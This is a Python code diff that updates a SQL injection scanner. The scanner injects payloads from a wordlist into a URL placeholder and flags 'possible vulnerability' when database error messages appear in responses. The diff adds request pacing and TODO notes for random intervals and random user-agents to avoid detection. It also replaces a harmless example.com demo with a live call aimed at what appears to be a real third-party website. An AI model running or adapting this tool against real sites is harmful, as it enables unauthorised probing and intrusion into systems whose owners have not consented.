@@ -1,9 +1,15 @@
-import requests
+from datetime import datetime as dt
+import time
 
 import functions
 
-# recebe uma url por vez
-def sqli(url: str, file: str, timeout=10, proxies=None):
+def sqli(url, file, timeout=10, SSL=True, proxies=None, interval=5, advanced=False):
+
+    # tornar o modo advanced uma forma de reconhecimento do sql
+    # colocar um intervalo randomico
+    # colocar um gerador de user-agent randomico
+    # alterar o test_url para que aceite http tambem
+    # verificar como retornar dados do ssl
     
     sql_errors = [
         'You have an error in your SQL syntax',
@@ -24,33 +30,27 @@ def sqli(url: str, file: str, timeout=10, proxies=None):
     
     for payload in payloads:
         payload = payload.strip()
-        test_url = f'{url}?{payload}'
-        try:
-            r = requests.get(test_url, timeout=timeout, proxies=proxies)
+        test_url = f'https://{url}'.replace('*', payload)
+
+        time.sleep(interval) # intervalo entre requisicoes
+        time_now = dt.now().strftime('%d/%m/%Y %H:%M:%S') # hora atual
+
+        status, r = functions.request(test_url, timeout=timeout, SSL=SSL, proxies=proxies) # requisicao
+        
+        if status:
+            print(f'[-][{time_now}][{r.status_code}] Tentando: {test_url}')
             for error in sql_errors:
                 if error.lower() in r.text.lower():
-                    print(f'[+] Possível vulnerabilidade: {url} -> {payload}')
-                    return True, r.url
-        
-        except requests.exceptions.Timeout as timeout_error:
-            print(f'[-] Tempo limite de requisicao atingido: {r.url}')
-            continue
-        
-        except requests.RequestException as e:
-            print(f'[-] Erro ao tentar o payload: {payload} - {e}')
-            continue
+                    print(f'[+][{time_now}][{r.status_code}] Possível vulnerabilidade: {url} -> {payload}')
+                    return True, f'[+][{time_now}][{r.status_code}] Possível vulnerabilidade: {url} -> {payload}'
+        else:
+            print(f'[-][{time_now}] {r}')
     
-    return False, '[-] Nenhuma vulnerabilidade encontrada'
+    return False, f'[-][{time_now}] Nenhuma vulnerabilidade encontrada'
 
-'''
 # Exemplo de uso:
-def __name__ == '__main__':
-    url = 'http://example.com/vulnerable_page'
-    file = "payloads"
+status, attk = sqli('www.socasadas.com/?s=*',
+    '/home/maserati/Downloads/Python/wx78/wordlists/sqli/injection.txt',
+)
 
-    is_vulnerable = sqli(url, file)
-    if is_vulnerable:
-        print("O site é vulnerável!")
-    else:
-        print("Nenhuma vulnerabilidade encontrada.")
-'''
+print(attk)
